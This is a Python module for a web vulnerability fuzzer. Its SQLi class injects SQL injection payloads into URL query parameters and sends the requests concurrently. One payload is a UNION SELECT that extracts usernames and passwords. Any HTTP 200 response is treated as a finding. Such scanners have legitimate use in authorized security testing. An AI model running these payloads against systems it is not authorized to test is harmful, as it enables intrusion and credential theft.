from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style
import requests

class SQLi:
    def __init__(self, session, threads=5):
        self.session = session
        self.threads = threads
        # Default SQLi payloads; you can extend or customize these
        self.payloads = [
            "' OR 1=1 --",
            "' OR 'a'='a",
            "' UNION SELECT NULL, username, password FROM users --",
            "' AND 1=2 --",
            "' OR 1=1#",
            '" OR ""="',
            "' OR 1=1/*"
        ]
        # Optionally, you can define indicators for SQL errors here

    def set_payloads(self, payload_list):
        """
        Replace the default payloads with custom payloads.
        """
        self.payloads = payload_list

    def filter_targets(self, targets):
        """
        For SQLi, we simply use any target that has query parameters.
        """
        sqli_targets = []
        for target in targets:
            if 'params' in target and target['params']:
                sqli_targets.append(target)
        return sqli_targets

    def test_target(self, target):
        """
        For each parameter in the target's URL, replace its value with each payload,
        leaving the other parameters unchanged.
        """
        results = []
        original_url = target['url']
        parsed_url = urlparse(original_url)
        # Parse the original query string into a dictionary (each value is a list)
        original_params = parse_qs(parsed_url.query)

        for param in target.get('params', []):
            param_name = param['name']
            for payload in self.payloads:
                # Create a copy of the original parameters
                new_params = original_params.copy()
                # Replace the value for the target parameter with the payload.
                # (Note: values are lists, so we wrap payload in a list)
                new_params[param_name] = [payload]
                # Build a new query string
                new_query = urlencode(new_params, doseq=True)
                # Reconstruct the URL with the new query string
                new_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))
                try:
                    req = self.session.get(new_url, timeout=7)
                    # Basic check: if status is 200, report the result.
                    # You might improve detection by comparing response lengths or error messages.
                    if req.status_code == 200:
                        results.append({
                            'type': 'SQLi',
                            'url': req.url,
                            'param': param_name,
                            'payload': payload,
                            'status': req.status_code,
                            'length': len(req.content),
                            'source': target.get('source', 'unknown')
                        })
                except Exception as e:
                    print(f"{Fore.RED}[!] Error testing target {new_url}: {str(e)}{Style.RESET_ALL}")
                    continue
        return results

    def fuzz(self, targets):
        """
        Run the SQLi tests concurrently on the filtered targets.
        """
        filtered = self.filter_targets(targets)
        print(f"{Fore.CYAN}[*] Testing {len(filtered)} targets for SQLi{Style.RESET_ALL}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.test_target, t) for t in filtered]
            results = [result for future in futures for result in future.result()]
        
        return results
